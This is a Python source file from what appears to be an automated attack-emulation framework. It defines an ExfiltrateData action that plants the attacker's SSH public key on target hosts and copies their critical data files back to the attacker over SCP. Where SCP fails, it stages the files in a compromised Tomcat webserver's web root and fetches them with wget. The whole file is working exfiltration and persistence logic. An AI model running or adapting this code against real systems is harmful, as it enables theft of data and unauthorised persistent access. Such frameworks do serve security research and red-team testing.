import os
from incalmo.models.agent import Agent

from incalmo.core.actions.high_level_action import HighLevelAction
from incalmo.core.actions.low_level_action import RESOLVE_HOME
from incalmo.core.actions.LowLevel import (
    MD5SumAttackerData,
    ReadFile,
    AddSSHKey,
    SCPFile,
    wgetFile,
    ListFilesInDirectory,
)
from incalmo.core.models.network import Host
from incalmo.core.models.events import Event, FileContentsFound, FilesFound
from incalmo.core.services import (
    LowLevelActionOrchestrator,
    EnvironmentStateService,
    AttackGraphService,
)
from incalmo.core.services.action_context import HighLevelContext
from config.attacker_config import Environment


class ExfiltrateData(HighLevelAction):
    def __init__(self, target_host: Host):
        super().__init__()
        self.target_host = target_host

    async def run(
        self,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        environment_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> list[Event]:
        target_agent = self.target_host.get_agent()
        if len(environment_state_service.initial_hosts) == 0:
            raise Exception("No attacker host found")

        attacker_host = environment_state_service.initial_hosts[0]
        attacker_agent = attacker_host.get_agent()
        if attacker_agent is None:
            raise Exception("No attacker agent found")

        # Skip if ICS environment
        # TODO bigger patch for when to skip data
        if environment_state_service.environment_type == Environment.ICS.value:
            return []

        if len(self.target_host.critical_data_files) == 0:
            return []

        if target_agent is None:
            return []

        webserver_exists = False
        for host in environment_state_service.network.get_all_hosts():
            if host.has_service("http") and len(host.agents) > 0:
                webserver_exists = True
                break

        if webserver_exists:
            # Exfiltrate data over http
            success = await self.indirect_http_exfiltrate(
                attacker_agent,
                self.target_host,
                low_level_action_orchestrator,
                environment_state_service,
                attack_graph_service,
                context,
            )
            if not success:
                await self.direct_ssh_exfiltrate(
                    attacker_agent, low_level_action_orchestrator, context
                )
        else:
            await self.direct_ssh_exfiltrate(
                attacker_agent, low_level_action_orchestrator, context
            )
        # Record results of any exfiltrated data
        return await self.record_exfil_results(
            attacker_agent, low_level_action_orchestrator, context
        )

    async def record_exfil_results(
        self,
        attack_agent: Agent,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        context: HighLevelContext,
    ):
        events = await low_level_action_orchestrator.run_action(
            MD5SumAttackerData(attack_agent), context
        )
        return events

    async def _get_ssh_public_key(
        self,
        agent: Agent,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        context: HighLevelContext,
    ) -> str | None:
        # Discover whatever .pub key exists rather than guessing the type
        list_events = await low_level_action_orchestrator.run_action(
            ListFilesInDirectory(agent, f"{RESOLVE_HOME}/.ssh"), context
        )
        pub_files = []
        for event in list_events:
            if isinstance(event, FilesFound):
                pub_files = [f for f in event.files if f.endswith(".pub")]
                break

        for filename in pub_files:
            events = await low_level_action_orchestrator.run_action(
                ReadFile(agent, f"{RESOLVE_HOME}/.ssh/{filename}"), context
            )
            for event in events:
                if (
                    isinstance(event, FileContentsFound)
                    and event.contents
                    and event.contents.startswith("ssh-")
                ):
                    return event.contents
        return None

    async def direct_ssh_exfiltrate(
        self,
        attacker_agent: Agent,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        context: HighLevelContext,
    ):
        ssh_key_data = await self._get_ssh_public_key(
            attacker_agent, low_level_action_orchestrator, context
        )

        if not ssh_key_data:
            return

        for user, file_paths in self.target_host.critical_data_files.items():
            target_agent = self.target_host.get_agent_by_username(user)
            if target_agent is None:
                continue

            # Add SSH key to target host
            await low_level_action_orchestrator.run_action(
                AddSSHKey(target_agent, ssh_key_data), context
            )

            for critical_filepath in file_paths:
                # Exfiltrate data
                ssh_port = self.target_host.get_port_for_service("ssh")
                ssh_ip = self.target_host.get_ip_address()
                if ssh_ip is None:
                    # Error, unable to exfitlrate data
                    continue
                if ssh_port is None:
                    ssh_port = "22"
                ssh_port = str(ssh_port)

                ssh_user = target_agent.username
                filename = f"{RESOLVE_HOME}/" + os.path.basename(critical_filepath)

                await low_level_action_orchestrator.run_action(
                    SCPFile(
                        attacker_agent,
                        ssh_ip,
                        ssh_user,
                        ssh_port,
                        critical_filepath,
                        filename,
                    ),
                    context,
                )

    async def indirect_http_exfiltrate(
        self,
        attacker_agent: Agent,
        target_host: Host,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        env_state_service: EnvironmentStateService,
        attack_graph_service: AttackGraphService,
        context: HighLevelContext,
    ) -> bool:
        hosts_with_creds = attack_graph_service.find_hosts_with_credentials_to_host(
            target_host
        )
        webserver_host = None

        for host in hosts_with_creds:
            if host.has_service("http"):
                webserver_host = host
                break

        if webserver_host is None:
            for host in env_state_service.network.get_all_hosts():
                if host.has_service("http") and len(host.agents) > 0:
                    webserver_host = host
                    break

        if webserver_host is None:
            raise Exception("No webservers to exfiltrate to")

        key_added = await self.add_ssh_key(
            webserver_host, target_host, low_level_action_orchestrator, context
        )
        if not key_added:
            return False

        for user, critical_filepaths in self.target_host.critical_data_files.items():
            for critical_filepath in critical_filepaths:
                # SCP data to ssh host
                ssh_port = self.target_host.get_port_for_service("ssh")
                ssh_ip = self.target_host.get_ip_address()
                if ssh_ip is None:
                    # Error, unable to exfitlrate data
                    raise Exception("Unknown SSH ip")

                if ssh_port is None:
                    ssh_port = 22

                ssh_user = user
                filename = os.path.basename(critical_filepath)
                for http_agent in webserver_host.agents:
                    await low_level_action_orchestrator.run_action(
                        SCPFile(
                            http_agent,
                            ssh_ip=ssh_ip,
                            ssh_user=ssh_user,
                            ssh_port=str(ssh_port),
                            src_filepath=critical_filepath,
                            dst_filepath=f"/opt/tomcat/webapps/ROOT/{filename}",
                        ),
                        context,
                    )

        # Wget files from webservers
        ssh_host_ip = webserver_host.get_ip_address()
        webserver_port = webserver_host.get_port_for_service("http")

        if ssh_host_ip is None or webserver_port is None:
            return False

        for user, critical_filepaths in self.target_host.critical_data_files.items():
            for critical_filepath in critical_filepaths:
                filename = os.path.basename(critical_filepath)
                await low_level_action_orchestrator.run_action(
                    wgetFile(
                        attacker_agent,
                        url=f"http://{ssh_host_ip}:{webserver_port}/{filename}",
                    ),
                    context,
                )
        return True

    async def add_ssh_key(
        self,
        source_host: Host,
        target_host: Host,
        low_level_action_orchestrator: LowLevelActionOrchestrator,
        context: HighLevelContext,
    ) -> bool:
        key_added = False
        for src_agent in source_host.agents:
            ssh_key_data = await self._get_ssh_public_key(
                src_agent, low_level_action_orchestrator, context
            )

            if ssh_key_data is None:
                continue

            for target_agent in target_host.agents:
                await low_level_action_orchestrator.run_action(
                    AddSSHKey(target_agent, ssh_key_data), context
                )
            key_added = True
        return key_added
